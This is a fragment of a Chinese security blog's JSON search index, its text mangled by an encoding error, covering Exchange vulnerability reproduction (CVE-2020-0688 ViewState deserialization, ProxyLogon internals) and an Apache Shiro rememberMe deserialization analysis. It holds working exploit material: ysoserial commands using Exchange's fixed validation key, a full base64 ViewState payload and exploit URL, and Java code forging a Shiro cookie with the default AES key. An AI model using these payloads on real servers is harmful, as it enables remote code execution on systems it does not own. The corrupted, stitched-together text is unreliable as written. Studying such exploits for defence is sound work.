çš„åŸå§‹å“åº”ã€‚ æ‰¾åˆ° ASP.NET_SessionId çš„ cookieï¼š ASP.NET_SessionId=d7d6614a-4959-4989-a3d1-27e6efd8875d æœç´¢ __VIEWSTATEGENERATOR è·å–å­—æ®µå€¼ï¼š B97B4E27 5.2.3.3 ç”Ÿæˆ payload éœ€è¦ç”¨åˆ° ysoserial.net ç”Ÿæˆæ‰§è¡Œç¨‹åºçš„ payload ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"calc.exe\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"d7d6614a-4959-4989-a3d1-27e6efd8875d\" --isdebug --islegacy å¾—åˆ°ï¼š /wEylAcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC2BTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LSXUwoXG5VzeGJVCJLwnNz8xsRfw= ç”Ÿæˆå®Œ payload ä»£ç åï¼Œéœ€è¦å¯¹è¯¥ä»£ç ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ URL Encode ç¼–ç æ„é€ ä¸€ä¸ª URLï¼š /ecp/default.aspx?__VIEWSTATEGENERATOR=\u003cgenerator\u003e\u0026__VIEWSTATE=\u003cViewState\u003e å°†æœ€å¼€å§‹è·å¾—çš„ __VIEWSTATEGENERATOR å€¼æ›¿æ¢ generatorï¼Œå°† URL Encode ç¼–ç åçš„ payload æ›¿æ¢ ViewStateã€‚ ç”Ÿæˆå†™æ–‡ä»¶çš„ payload ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c echo POC \u003e C:\\1.txt\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"80677c59-fde2-4534-b8ae-97f3997b009a\" --isdebug --islegacy ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.3 ProxyLogon 5.3.1 æ¼æ´æè¿° ProxyLogon æ˜¯ CVE-2021-26855 å’Œ CVE-2021-27065 ä¸¤ä¸ªæ¼æ´çš„ç»„åˆåˆ©ç”¨ã€‚ Exchange æ˜¯ä¸€ä¸ªéå¸¸å¤æ‚çš„åº”ç”¨ç¨‹åºã€‚ è‡ª 2000 å¹´ä»¥æ¥ï¼ŒExchange æ¯ 3 å¹´å‘å¸ƒä¸€ä¸ªæ–°ç‰ˆæœ¬ã€‚ æ¯å½“ Exchange å‘å¸ƒæ–°ç‰ˆæœ¬æ—¶ï¼Œä½“ç³»ç»“æ„éƒ½ä¼šå‘ç”Ÿå¾ˆå¤§å˜åŒ–å¹¶å˜å¾—ä¸åŒã€‚æ¶æ„å’Œè¿­ä»£çš„å˜åŒ–ä½¿å¾—å‡çº§ Exchange Server å˜å¾—å›°éš¾ã€‚ ä¸ºäº†ä¿è¯æ–°æ—§æ¶æ„ä¹‹é—´çš„å…¼å®¹æ€§ï¼ŒExchange Server å¯¼è‡´å­˜åœ¨äº†æ–°çš„æ”»å‡»é¢ã€‚ åœ¨ Microsoft Exchange ä¸Šé‡ç‚¹å…³æ³¨äºå®¢æˆ·ç«¯è®¿é—®æœåŠ¡ Client Access Service(CAS)ã€‚ CAS æ˜¯ Exchange çš„åŸºæœ¬ç»„ä»¶ã€‚åœ¨ Exchange 2000/2003 ç‰ˆæœ¬ï¼ŒCAS æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ Frontend Serverï¼Œè´Ÿè´£æ‰€æœ‰ Frontend Web çš„é€»è¾‘ã€‚ ç»è¿‡å¤šæ¬¡é‡å‘½åã€é›†æˆå’Œç‰ˆæœ¬å·®å¼‚ï¼ŒCAS å·²æˆä¸º Mail Role ä¸‹çš„ç»„ä»¶ã€‚ 5.3.1.1 CAS æ¶æ„ CAS æ˜¯è´Ÿè´£æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„æ‰€æœ‰è¿æ¥çš„åŸºæœ¬ç»„ä»¶ï¼ŒåŒ…æ‹¬ HTTPã€POP3ã€IMAP è¿˜æ˜¯ SMTPï¼Œå¹¶å°†è¿æ¥ä»£ç†åˆ°ç›¸åº”çš„åç«¯æœåŠ¡ã€‚ CAS ç½‘ç«™æ­å»ºåœ¨ Microsoft IIS ä¸Šã€‚IIS ä¸­æœ‰ä¸¤ä¸ªç«™ç‚¹ã€‚ã€ŒDefault Websiteã€æ˜¯ä¹‹å‰æåˆ°çš„å‰ç«¯ï¼Œã€ŒExchange Backendã€æ˜¯è´Ÿè´£å¤„ç†ä¸šåŠ¡é€»è¾‘ã€‚æŸ¥çœ‹é…ç½®åå¯ä»¥å‘ç°ï¼ŒFrontend ç»‘å®šäº† 80 å’Œ 443 ç«¯å£ï¼ŒExchange Backend ç›‘å¬äº† 81 å’Œ 444 ç«¯å£ã€‚æ‰€æœ‰ç«¯å£éƒ½ç»‘å®šäº† 0.0.0.0ï¼Œè¿™æ„å‘³ç€å¯ä»¥è®¿é—® Frontend å’Œ Backendã€‚ Exchange ç³»ç»Ÿçš„æœåŠ¡æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç”±å‰ç«¯å’Œå¤šä¸ªåç«¯ç»„ä»¶ç»„æˆã€‚â½¤æˆ·åŸºäºå„ç±»åè®®å¯¹ Exchange çš„å‰ç«¯å‘èµ·è¯·æ±‚ï¼Œå‰ç«¯è§£æè¯·æ±‚åä¼šå°†å…¶è½¬å‘åˆ°åç«¯ç›¸å¯¹åº”çš„æœåŠ¡å½“ä¸­ã€‚ä»¥åŸºäº HTTP/HTTPS åè®®çš„è®¿é—®ä¸ºä¾‹ï¼Œæ¥â¾ƒ Outlook æˆ– Web å®¢æˆ·ç«¯çš„è¯·æ±‚ä¼šâ¾¸å…ˆç»è¿‡ IISï¼Œç„¶åè¿›â¼Šåˆ° Exchange çš„ HTTP ä»£ç†ï¼Œä»£ç†æ ¹æ®è¯·æ±‚ç±»å‹å°† HTTP è¯·æ±‚è½¬å‘åˆ°ä¸åŒçš„åç«¯ç»„ä»¶ä¸­ã€‚ 5.3.1.2 Frontend Proxy Frontend Proxy æ¨¡å—æ ¹æ®å½“å‰çš„ ApplicationPath é€‰æ‹©å¤„ç†ç¨‹åºæ¥å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„ HTTP è¯·æ±‚ã€‚ æ¯”å¦‚è®¿é—® /EWS ä¼šä½¿ç”¨ EwsProxyRequestHandlerï¼Œè€Œ /OWA ä¼šè§¦å‘ OwaProxyRequestHandlerã€‚ Exchange ä¸­çš„æ‰€æœ‰å¤„ç†ç¨‹åºéƒ½ç»§æ‰¿äº† ProxyRequestHandler ç±»ï¼Œå¹¶å®ç°äº†å®ƒçš„æ ¸å¿ƒé€»è¾‘ï¼ŒåŒ…æ‹¬ï¼šå¦‚ä½•å¤„ç†æ¥è‡ªç”¨æˆ·çš„ HTTP è¯·æ±‚ï¼Œä» Backend åˆ°ä»£ç†çš„ URLï¼Œä»¥åŠå¦‚ä½•ä¸ Backend åŒæ­¥ä¿¡æ¯ã€‚è¯¥ç±»ä¹Ÿæ˜¯æ•´ä¸ª Proxy Module ä¸­æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œå°† ProxyRequestHandler åˆ†æˆ 3 ä¸ªéƒ¨åˆ†ï¼š Request Section Request Section è§£ææ¥è‡ªå®¢æˆ·ç«¯çš„ HTTP è¯·æ±‚å¹¶ç¡®å®šå“ªäº› cookie å’Œæ ‡å¤´å¯ä»¥ä»£ç†åˆ°åç«¯ã€‚Frontend å’Œ Backend ä¾é  HTTP Headers æ¥åŒæ­¥ä¿¡æ¯å’Œä»£ç†å†…éƒ¨çŠ¶æ€ã€‚å› æ­¤ï¼ŒExchange å®šä¹‰äº†ä¸€ä¸ªé»‘åå•ï¼Œä»¥é¿å…æŸäº›å†…éƒ¨ Headers è¢«æ»¥ç”¨ã€‚ protected virtual bool ShouldCopyHeaderToServerRequest(string headerName) { return !string.Equals(headerName, \"X-CommonAccessToken\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-IsFromCafe\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-SourceCafeServer\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"msExchProxyUri\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-MSExchangeActivityCtx\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"return-client-request-id\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-Forwarded-For\", OrdinalIgnoreCase) \u0026\u0026 (!headerName.StartsWith(\"X-Backend-Diag-\", OrdinalIgnoreCase) || this.ClientRequest.GetHttpRequestBase().IsProbeRequest()); } åœ¨ Request çš„æœ€åé˜¶æ®µï¼ŒProxy Module ä¼šè°ƒç”¨ handler å®ç°çš„ AddProtocolSpecificHeadersToServerRequest æ–¹æ³•ï¼Œåœ¨ HTTP å¤´ä¸­æ·»åŠ è¦ä¸ Backend äº¤æ¢çš„ä¿¡æ¯ã€‚è¿™ä¸€é˜¶æ®µè¿˜ä¼šå°†å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯åºåˆ—åŒ–ï¼Œæ”¾åˆ°ä¸€ä¸ªæ–°çš„ HTTP å¤´ X-CommonAccessToken ä¸­ï¼Œå†è½¬å‘ç»™ Backendã€‚ Proxy Section Proxy Section é¦–å…ˆä½¿ç”¨ GetTargetBackendServerURL æ–¹æ³•æ¥è®¡ç®—åº”å°† HTTP è¯·æ±‚è½¬å‘åˆ°å“ªä¸ªåç«¯ URLã€‚ ç„¶åä½¿ç”¨ CreateServerRequest æ–¹æ³•åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ HTTP å®¢æˆ·ç«¯è¯·æ±‚ã€‚ HttpProxy\\ProxyRequestHandler.cs protected HttpWebRequest CreateServerRequest(Uri targetUrl) { HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(targetUrl); if (!HttpProxySettings.UseDefaultWebProxy.Value) { httpWebRequest.Proxy = NullWebProxy.Instance; } httpWebRequest.ServicePoint.ConnectionLimit = HttpProxySettings.ServicePointConnectionLimit.Value; httpWebRequest.Method = this.ClientRequest.HttpMethod; httpWebRequest.Headers[\"X-FE-ClientIP\"] = ClientEndpointResolver.GetClientIP(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); httpWebRequest.Headers[\"X-Forwarded-For\"] = ClientEndpointResolver.GetClientProxyChainIPs(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); httpWebRequest.Headers[\"X-Forwarded-Port\"] = ClientEndpointResolver.GetClientPort(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); httpWebRequest.Headers[\"X-MS-EdgeIP\"] = Utilities.GetEdgeServerIpAsProxyHeader(SharedHttpContextWrapper.GetWrapper(this.HttpContext).Request); // ... return httpWebRequest; } Exchange è¿˜å°†é€šè¿‡åç«¯çš„ HTTP Service-Class ç”Ÿæˆ Kerberos ç¥¨è¯ï¼Œå¹¶å°†å…¶æ”¾å…¥ Authorization å¤´ä¸­ã€‚ æ­¤è¯·æ±‚å¤´æ—¨åœ¨é˜²æ­¢åŒ¿åç”¨æˆ·ç›´æ¥è®¿é—®åç«¯ã€‚ä½¿ç”¨ Kerberos ç¥¨è¯ï¼Œåç«¯å¯ä»¥éªŒè¯æ¥è‡ªå‰ç«¯çš„è®¿é—®ã€‚ HttpProxy\\ProxyRequestHandler.cs if (this.ProxyKerberosAuthentication) { serverRequest.ConnectionGroupName = this.ClientRequest.UserHostAddress + \":\" + GccUtils.GetClientPort(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); } else if (this.AuthBehavior.AuthState == AuthState.BackEndFullAuth || this. ShouldBackendRequestBeAnonymous() || (HttpProxySettings.TestBackEndSupportEnabled.Value \u0026\u0026 !","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å‚è€ƒ æ·±å…¥ Exchange Server åœ¨ç½‘ç»œæ¸—é€ä¸‹çš„åˆ©ç”¨æ–¹æ³• Abusing Exchange: One API call away from Domain Admin cve-2020-0688-Exchange-è¿œç¨‹ä»£ç æ‰§è¡Œä»‹ç» A New Attack Surface on MS Exchange Part 1 - ProxyLogon! ProxyLogonæ¼æ´åˆ†æ Exchange ProxyLogon ç³»åˆ—æ¼æ´åˆ†æ ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Exchange æ¼æ´åˆ©ç”¨","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Shiro ååºåˆ—åŒ–æ¼æ´ \u0026 CommonsCollectionsK1 \u0026 CommonsBeanutils1","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 æ¦‚è¿° Apache Shiro åœ¨ Java çš„æƒé™åŠå®‰å…¨éªŒè¯æ¡†æ¶ä¸­å ç”¨é‡è¦çš„ä¸€å¸­ä¹‹åœ°ï¼Œåœ¨å®ƒç¼–å·ä¸º 550 çš„ issue ä¸­çˆ†å‡ºä¸¥é‡çš„ Java ååºåˆ—åŒ–æ¼æ´ã€‚ Shiroååºåˆ—åŒ–æ¼æ´çš„åŸç†æ¯”è¾ƒç®€å•ï¼šä¸ºäº†è®©æµè§ˆå™¨æˆ–æœåŠ¡å™¨é‡å¯åç”¨æˆ·ä¸ä¸¢å¤±ç™»å½•çŠ¶æ€ï¼ŒShiro æ”¯æŒå°†æŒä¹…åŒ–ä¿¡æ¯åºåˆ—åŒ–å¹¶åŠ å¯†åä¿å­˜åœ¨ Cookie çš„ rememberMe å­—æ®µä¸­ï¼Œä¸‹æ¬¡è¯»å–æ—¶è¿›è¡Œè§£å¯†å†ååºåˆ—åŒ–ã€‚ä½†æ˜¯åœ¨ Shiro 1.2.4 ç‰ˆæœ¬ä¹‹å‰å†…ç½®äº†ä¸€ä¸ªé»˜è®¤ä¸”å›ºå®šçš„åŠ å¯† Keyï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ªé€ ä»»æ„çš„ rememberMe Cookieï¼Œè¿›è€Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚ å‰é¢çš„æ–‡ç« ï¼Œä»‹ç»äº† Commons-Collections é“¾çš„å„ç§ Gadgetï¼Œåˆ†ä¸ºä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼šä¸€ç§æ˜¯ InvokerTransformerï¼Œé€šè¿‡ Runtime.exec() å‘½ä»¤æ‰§è¡Œï¼›å¦ä¸€ç§æ˜¯ TemplatesImplï¼Œé€šè¿‡åŠ è½½ç±»å­—èŠ‚ç çš„å½¢å¼ä»£ç æ‰§è¡Œã€‚ æœ¬æ–‡å…ˆä»¥ä¸€ä¸ªå®é™…çš„ä¾‹å­ â€”â€” Shiro ååºåˆ—åŒ–æ¼æ´ï¼Œæ¥å®é™…ä½¿ç”¨ä¸€ä¸‹ TemplatesImpl ã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 æ¼æ´ç¯å¢ƒæ­å»º åˆ©ç”¨ é¶åœº æ­å»ºæ¼æ´ç¯å¢ƒï¼Œæ•´ä¸ªé¡¹ç›®åªæœ‰ä¸¤ä¸ªä»£ç æ–‡ä»¶ï¼Œindex.jsp å’Œ login.jspï¼Œä¾èµ–è¿™å—ä¹Ÿä»…æœ‰ä¸‹é¢å‡ ä¸ª: shiro-coreã€shiro-webï¼Œè¿™æ˜¯ shiro æœ¬èº«çš„ä¾èµ– javax.servlet-apiã€jsp-apiï¼Œè¿™æ˜¯ JSP å’Œ Servlet çš„ä¾èµ–ï¼Œä»…åœ¨ç¼–è¯‘é˜¶æ®µä½¿ç”¨ï¼Œå› ä¸º Tomcat ä¸­è‡ªå¸¦è¿™ä¸¤ä¸ªä¾èµ– slf4j-apiã€slf4j-simpleï¼Œè¿™æ˜¯ä¸ºäº†æ˜¾ç¤º shiro ä¸­çš„æŠ¥é”™ä¿¡æ¯æ·»åŠ çš„ä¾èµ– commons-loggingï¼Œè¿™æ˜¯ shiro ä¸­ç”¨åˆ°çš„ä¸€ä¸ªæ¥å£ï¼Œä¸æ·»åŠ ä¼šçˆ† java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory é”™è¯¯ commons-collectionsï¼Œä¸ºäº†æ¼”ç¤ºååºåˆ—åŒ–æ¼æ´ï¼Œå¢åŠ äº†commons-collections ä¾èµ– ä½¿ç”¨ Maven å°†é¡¹ç›®æ‰“åŒ…æˆ war åŒ…ï¼Œæ”¾åœ¨ Tomcat çš„ webapps ç›®å½•ä¸‹ã€‚ç„¶åè®¿é—® http://localhost:8080/shirodemo/ ï¼Œä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢: ç„¶åè¾“å…¥æ­£ç¡®çš„è´¦å·å¯†ç ï¼Œroot/secretï¼Œå¯ä»¥æˆåŠŸç™»å½•ã€‚ å¦‚æœç™»å½•æ—¶é€‰æ‹©äº† remember me çš„å¤šé€‰æ¡†ï¼Œåˆ™ç™»å½•æˆåŠŸåæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ª rememberMe çš„ Cookieã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 ä½¿ç”¨ CC6 æ”»å‡» Shiro ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.1 æ¦‚è¿° æ•´ä¸ªæ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š ä½¿ç”¨ CommonsCollections åˆ©ç”¨é“¾ç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ– Payload ä½¿ç”¨ Shiro é»˜è®¤ Key è¿›è¡ŒåŠ å¯† å°†å¯†æ–‡ä½œä¸º rememberMe çš„ Cookie å‘é€ç»™æœåŠ¡ç«¯ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:1","tags":["ä»£ç å®¡è®¡"],"title":"Shiro ååºåˆ—åŒ–æ¼æ´åŸç†åˆ†æ","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.2 åŒ…å«æ•°ç»„çš„ååºåˆ—åŒ– Gadget import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client0 { public static void main(String []args) throws Exception { byte[] payloads = new CommonsCollections6().getPayload(\"calc.exe\"); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } åŠ å¯†çš„è¿‡ç¨‹ï¼Œä½¿ç”¨çš„ shiro å†…ç½®çš„ç±» org.apache.shiro.crypto.AesCipherService ï¼Œæœ€åç”Ÿæˆä¸€æ®µ base64 å­—ç¬¦ä¸²ã€‚ ç›´æ¥å°†è¿™æ®µå­—ç¬¦ä¸²ä½œä¸º rememberMe çš„å€¼(ä¸åš url ç¼–ç )ï¼Œå‘é€ç»™ shiroã€‚ç»“æœ Tomcat å‡ºç°äº†æŠ¥é”™ï¼š æ‰¾åˆ°æœ€åä¸€ä¸ªå¼‚å¸¸ä¿¡æ¯ org.apache.shiro.io.ClassResolvingObjectInputStreamï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ª ObjectInputStream çš„å­ç±»ï¼Œå…¶é‡å†™äº† resolveClass æ–¹æ³•: resolveClass æ˜¯ååºåˆ—åŒ–ä¸­ç”¨æ¥æŸ¥æ‰¾ç±»çš„æ–¹æ³•ï¼Œåœ¨è¯»å–åºåˆ—åŒ–æµçš„æ—¶å€™ï¼Œè¯»åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç±»åï¼Œéœ€è¦é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥æ‰¾åˆ°å¯¹åº”çš„ java.lang.Class å¯¹è±¡ã€‚ å¯¹æ¯”ä¸€ä¸‹å®ƒçš„çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸çš„ ObjectInputStream ç±»ä¸­çš„ resolveClass æ–¹æ³•ï¼š protected Class\u003c?\u003e resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String name = desc.getName(); try { return Class.forName(name, false, latestUserDefinedLoader()); } catch (ClassNotFoundException ex) { Class\u003c?\u003e cl = primClasses.get(name); if (cl != null) { return cl; } else { throw ex; } } } ä¼šå‘ç°ï¼Œå‰è€…ç”¨çš„æ˜¯ org.apache.shiro.util.ClassUtils#forNameï¼Œè€Œåè€…ç”¨çš„æ˜¯ Java åŸç”Ÿçš„ Class.forNameã€‚ åœ¨å¼‚å¸¸æ•æ‰çš„ä½ç½®ä¸‹ä¸ªæ–­ç‚¹ï¼Œçœ‹çœ‹æ˜¯å“ªä¸ªç±»è§¦å‘äº†å¼‚å¸¸: å¯è§ï¼Œå‡ºå¼‚å¸¸æ—¶åŠ è½½çš„ç±»åä¸º [Lorg.apache.commons.collections.Transformer;ã€‚å…¶å®å°±æ˜¯è¡¨ç¤º org.apache.commons.collections.Transformer çš„æ•°ç»„ã€‚ 3.2.1 Class.forName å’Œ ClassLoader.loadClass çš„åŒºåˆ« å½“ä½¿ç”¨ ClassLoader.loadClass(String name) æ—¶ï¼Œname å¿…é¡»æ˜¯ Java è¯­è¨€è§„èŒƒå®šä¹‰çš„äºŒè¿›åˆ¶åç§°ï¼Œå¹¶ä¸åŒ…æ‹¬æ•°ç»„ç±»ï¼›ç±»åŠ è½½å™¨è´Ÿè´£åŠ è½½ç±»çš„å¯¹è±¡ï¼Œæ•°ç»„ç±»çš„ç±»å¯¹è±¡ä¸æ˜¯ç”±ç±»åŠ è½½å™¨åˆ›å»ºçš„ï¼Œè€Œæ˜¯æ ¹æ® Java è¿è¡Œæ—¶çš„è¦æ±‚è‡ªåŠ¨åˆ›å»ºçš„ã€‚ ä»¥ä¸‹é¢ä»£ç ä¸ºä¾‹ï¼š package ClassLoaderDemo; public class ClassLoaderDemo { public static void main(String[] args) throws ClassNotFoundException { String c1name = \"test1\".getClass().getName(); String c2name = new String[]{\"test2\"}.getClass().getName(); System.out.println(c1name); System.out.println(c2name); Class.forName(c1name); Class.forName(c2name); ClassLoaderDemo.class.getClassLoader().loadClass(c1name); ClassLoaderDemo.class.getClassLoader().loadClass(c2name); } } 3.2.2 çœŸå®åŸå›  ç½‘ä¸Šå¤§éƒ¨åˆ†åˆ†æåŸå› éƒ½æ˜¯è¯´ Class.forName() ä¸ ClassLoader.loadClass() çš„åŒºåˆ«å¯¼è‡´ shiro ååºåˆ—åŒ–æ—¶ä¸èƒ½åŠ è½½æ•°ç»„ï¼Œè¿™ä¸ªåŸå› ä¸å®Œå…¨å‡†ç¡®ã€‚ å…¶å®æ˜¯ shiro åŠ è½½ Class æœ€ç»ˆè°ƒç”¨çš„æ˜¯ Tomcat ä¸‹çš„ webappclassloaderï¼Œè¯¥ç±»ä¼šä½¿ç”¨ Class.forName() åŠ è½½æ•°ç»„ç±»ï¼Œä½†æ˜¯ä½¿ç”¨çš„ classloader æ˜¯ URLClassLoaderï¼Œåªä¼šåŠ è½½ tomcat/binã€tomcat/libã€jre/lib/ext ä¸‹é¢çš„ç±»æ•°ç»„ï¼Œæ— æ³•åŠ è½½ä¸‰æ–¹ä¾èµ– jar åŒ…ã€‚ æ€»ä¹‹ï¼Œå¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«é Java è‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ã€‚å› ä¸º CC6 ç”¨åˆ°äº† Transformer æ•°ç»„ï¼Œå› æ­¤æ²¡æ³•æ­£å¸¸ååºåˆ—åŒ–ã€‚ ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:2","tags":["ä»£ç å®¡è®¡"],"title":"Shiro 